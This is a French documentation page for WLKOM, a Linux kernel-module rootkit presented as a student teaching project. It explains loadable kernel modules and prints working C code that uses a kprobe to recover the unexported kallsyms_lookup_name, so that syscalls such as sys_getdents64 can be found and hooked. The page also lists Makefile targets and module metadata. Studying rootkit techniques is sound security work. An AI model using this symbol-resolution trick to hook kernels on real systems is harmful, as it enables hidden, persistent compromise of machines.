---
id: kernel
title: 'Détails: Noyau & Symboles'
sidebar_position: 8
---

# Détails Techniques : Noyau Linux & LKM

Cette section approfondit les concepts liés au développement de modules noyau (LKM) et aux défis techniques rencontrés lors de l'implémentation de WLKOM.

## Qu'est-ce qu'un LKM ?

Un **Loadable Kernel Module (LKM)** est un morceau de code pouvant être chargé et déchargé dynamiquement dans le noyau Linux. Il s'exécute dans le **ring 0**, avec un accès complet aux ressources. WLKOM détourne ce mécanisme légitime (normalement utilisé pour les drivers) pour créer un rootkit furtif.

## Résolution de symboles (Linux 5.7+)

**Le problème** : Depuis la version 5.7 du noyau, la fonction `kallsyms_lookup_name()` n'est plus exportée publiquement. Cette fonction est pourtant indispensable pour trouver l'adresse mémoire des fonctions que nous souhaitons détourner (comme `sys_getdents64`).

**La solution WLKOM** : Nous utilisons une technique de **kprobe** (Kernel Probe) pour contourner cette limitation :
1. On enregistre une sonde temporaire sur le symbole `kallsyms_lookup_name`.
2. On récupère l'adresse de la fonction depuis la structure de la sonde (`kp.addr`).
3. On désenregistre immédiatement la sonde.
4. On peut alors appeler la vraie fonction pour résoudre n'importe quel autre symbole du noyau.

```c
static unsigned long resolve_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    kallsyms_lookup_name_t fn;
    unsigned long addr;

    if (register_kprobe(&kp) < 0)
        return 0;
    fn = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    addr = fn(name);
    return addr;
}
```

## Makefile du module

Le Makefile gère la compilation via le système **kbuild** du noyau Linux.

| Cible | Commande | Action |
| :--- | :--- | :--- |
| **all** | `make` | Compile `wlkom.ko`. |
| **uninstall** | `sudo make uninstall` | Désactive le service et tente de supprimer les fichiers de persistance. |
| **clean** | `make clean` | Nettoie les artefacts de compilation. |

## Métadonnées du module

```c
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robin.P, Joaquim.DM, Lucas.LP");
MODULE_DESCRIPTION("WLKOM Rootkit pedagogical project");
MODULE_VERSION("1.0");
```
